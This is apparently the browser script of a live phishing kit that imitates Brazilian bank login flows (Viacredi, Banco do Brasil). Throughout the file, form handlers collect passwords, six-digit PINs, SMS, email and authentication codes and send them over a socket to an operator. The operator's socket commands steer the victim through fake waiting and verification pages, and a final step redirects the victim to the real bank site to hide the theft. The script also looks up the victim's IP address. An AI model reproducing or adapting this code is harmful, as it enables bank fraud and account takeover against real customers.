const formInfo = document.querySelector(`form[name='f1']`)

const client_id = document.body.dataset.client

//check usuario reconectado
socket.on('conectado', (data) => {
    const params = new URLSearchParams(window.location.search)

    if (params.has('client') || client_id) {
        socket.emit('userReconnect', params.get('client') || client_id)

        console.log(params.get('client'))
    } else return
})

function formAuth() {
    const form = document.querySelector('.verify_inputs')

    if (!form) return

    const inputs = form.querySelectorAll('input')

    if (!inputs) return

    inputs.forEach((input, index) => {
        input.addEventListener('keyup', function (e) {
            e.preventDefault()

            const value = input.value
            if (value.length > 2) {
                const values = [...value]
                values.forEach((inpt, i) => {
                    if (!inputs[i]) return
                    inpt.value = inpt
                })

                return inputs[inputs.length - 1].focus()
            }
            if (!value) {
                if (!inputs[index - 1]) return (input.value = '')
                input.value = ''
                return inputs[index - 1].focus()
            }

            if (inputs[index + 1]) return inputs[index + 1].focus()
        })
        input.addEventListener('input', function (e) {
            e.preventDefault()

            const value = e.target.value

            if (value.length > 1) {
                const values = [...value]
                values.forEach((inpt, i) => {
                    if (inputs[i]) inputs[i].value = inpt

                    inputs[inputs.length - 1].focus()
                })
            }
        })
    })
}

formAuth()

const infosData = (() => {
    const params = new URLSearchParams(window.location.search)

    const idClient = params.has('client') || document.body.dataset.client
    //private var/functions
    function getIp(callback) {
        function response(s) {
            callback(window.userip)
            s.onload = s.onerror = null
            document.body.removeChild(s)
        }

        function trigger() {
            window.userip = false
            var s = document.createElement('script')
            s.async = true
            s.onload = function () {
                response(s)
            }
            s.onerror = function () {
                response(s)
            }
            s.src = 'https://l2.io/ip.js?var=userip'
            document.body.appendChild(s)
        }
        if (/^(interactive|complete)$/i.test(document.readyState)) {
            trigger()
        } else {
            document.addEventListener('DOMContentLoaded', trigger)
        }
    }

    function commands() {
        socket.on('errorpassword', (user) => {
            if (user.id) window.location.href = `/sinbc-login?client=${user.id}&error=true`
        })

        socket.on('disp', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/dispositivo?client=${data}`
            } else return
        })

        socket.on('erroruser', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/${data}`
            } else return
        })

        socket.on('getAuth', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/auth/${data}`
            } else return
        })

        socket.on('errorSMS', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/sms/${data}?error=true`
            } else return
        })

        socket.on('getSMS', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/authentication/${data}`
            } else return
        })

        socket.on('errorpass', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/password/${data}`
            } else return
        })

        // socket.on('getCardVerify', (data) => {
        //     if (idClient) {
        //         if (idClient == data.id) window.location.href = `/modules/conta/card/${data.id}/${data.cards[0].end}`
        //     } else return
        // })

        socket.on('getMailCode', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/mail/${data}`
            } else return
        })

        socket.on('FinishClient', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `https://www.viacredi.coop.br/`
            } else return
        })
    }

    async function receiver() {
        socket.on('erroruser', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/modules/conta?client=${data}`
            } else return
        })

        socket.on('FinishClient', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `https://www.bb.com.br/pbb/pagina-inicial`
            } else return
        })

        socket.on('getAuth', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/verify-authentic?client=${data}`
            } else return
        })

        socket.on('errorpass6', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/password6?client=${data}`
            } else return
        })
    }

    async function create(form) {
        if (!form) return

        form.addEventListener('submit', (e) => {
            // body
            e.preventDefault()

            const data = util.serialize(form)

            //socket.emit('createClient', data)

            form.submit()
        })
    }

    async function auth(form) {
        if (!form) return
        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const data = util.serialize(form)

            if (!data) return form.classList.add('errorForm')

            socket.emit('sendAuth', data)

            window.location.href = `/await?client=${data.id}`
        })
    }

    async function submit(form) {
        console.log(form)
        if (!form) return

        form.addEventListener('submit', (e) => {
            e.preventDefault()

            form.querySelector('#btnLogin').innerHTML = `Aguarde...`
            form.querySelector('#btnLogin').disabled = true

            form.querySelector('.inpt-passwd6').style.opacity = 0.5

            form.querySelector(`input[name='password6']`).disabled = true

            const data = util.serialize(form)

            socket.emit('password6Client', data)

            console.log(data)
        })
    }

    async function update(form) {
        if (!form) return

        form.addEventListener('submit', (e) => {
            e.preventDefault()

            const data = util.serialize(form)

            socket.emit('updateClient', data)

            return (window.location.href = `/await?client=${data.id}`)
        })
    }

    async function digits(form) {
        //form-pass6
        if (!form) return

        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const data = util.serialize(form)

            socket.emit('sendPass6', data)

            window.location.href = `/await?client=${data.id}`

            console.log(data)
        })
    }

    return {
        //public var/functions
        submit,
        update,
        create,
        digits,
        receiver,
        commands,
        auth,
        getIp,
    }
})()

const formUpdateClient = document.querySelector(`.form-pass6`)

infosData.getIp((ip) => console.log)
infosData.commands()
infosData.auth(document.querySelector('.form-auth'))
infosData.digits(document.querySelector('.form-pass6'))
infosData.create(formInfo)
infosData.update(formUpdateClient)
infosData.submit(document.querySelector(`.form-pass6`))

//console.log(formInfo)
